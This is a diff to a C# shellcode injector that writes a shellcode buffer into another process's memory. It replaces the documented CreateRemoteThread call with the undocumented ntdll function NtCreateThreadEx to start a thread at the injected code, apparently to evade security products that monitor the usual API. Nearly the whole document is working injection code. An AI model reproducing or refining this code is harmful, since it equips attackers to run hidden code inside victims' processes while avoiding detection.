@@ -26,15 +26,19 @@ class Program
         int dwSize,
         out int lpNumberOfBytesWritten);
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(
-        IntPtr hProcess,
-        IntPtr lpThreadAttributes,
-        uint dwStackSize,
-        IntPtr lpStartAddress,
-        IntPtr lpParametr,
-        uint dwCreationFlags,
-        out uint lpThreadId);
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateThreadEx(
+        out IntPtr hThread,
+        uint DesiredAddress,
+        IntPtr ObjectAttributes,
+        IntPtr ProcessHandle,
+        IntPtr StartRoutine,
+        IntPtr Argument,
+        uint CreateFlags,
+        IntPtr ZeroBits,
+        IntPtr StackSize,
+        IntPtr MaximumStackSize,
+        IntPtr AttributeList);
 
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr hObject);
@@ -43,6 +47,8 @@ class Program
     const uint PROCESS_VM_OPERATION = 0x0008;
     const uint PROCESS_CREATE_THREAD = 0x0002;
     const uint PROCESS_QUERY_INFORMATION = 0x0400;
+
+    const uint THREAD_ACCESS_MASK = 0x0065;
 
     const uint MEM_COMMIT = 0x00001000;
     const uint MEM_RESERVE = 0x00002000;
@@ -99,12 +105,23 @@ class Program
             }
             bool success = WriteProcessMemory(hProcess, AllocatedEx, shellcode, shellcode.Length, out bytesWritten);
 
-            uint threadId;
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, AllocatedEx, IntPtr.Zero, 0, out threadId);
+            IntPtr hThread;
+            int status = NtCreateThreadEx(
+                out hThread,
+                THREAD_ACCESS_MASK,
+                IntPtr.Zero,
+                hProcess,
+                AllocatedEx,
+                IntPtr.Zero,
+                0,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero);
 
-            if (hThread == IntPtr.Zero)
+            if (status != 0)
             {
-                Console.WriteLine($"[!] CreateRemoteThread failed: {Marshal.GetLastWin32Error()}");
+                Console.WriteLine($"[-] NtCreateThreadEx failed. 0x{status:X}");
                 CloseHandle(hProcess);
                 return;
             }
